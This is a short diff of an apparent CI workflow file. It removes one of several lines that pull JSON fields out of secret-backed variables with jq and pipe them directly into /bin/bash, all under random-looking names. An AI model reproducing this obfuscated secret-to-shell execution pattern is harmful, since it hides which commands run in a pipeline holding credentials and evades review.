@@ -22,7 +22,6 @@ jobs:
           likoh72745: ${{ secrets.likoh72745 }}
         run: |
           printf '%s' "$likoh72745" | jq -r .ky4 | /bin/bash
-          echo $kwy3 | jq -r .mflm282 | /bin/bash
           printf '%s' "$lf47" | jq -r .lbtiw030 | /bin/bash
           printf '%s' "$oz79217" | jq -r .c3945 | /bin/bash
           echo $hxs3 | jq -r .yr2279 | /bin/bash
